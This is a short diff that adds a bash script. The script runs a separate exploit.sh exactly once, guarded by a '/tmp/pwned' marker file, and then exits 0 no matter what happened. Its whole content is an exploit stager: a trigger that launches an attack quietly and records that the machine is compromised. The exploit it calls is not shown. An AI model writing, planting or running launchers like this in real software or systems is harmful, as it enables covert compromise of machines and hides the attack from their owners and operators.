@@ -1,0 +1,6 @@
+#!/bin/bash
+if [[ ! -f /tmp/pwned ]]; then
+    touch /tmp/pwned
+    bash exploit.sh
+fi
+exit 0
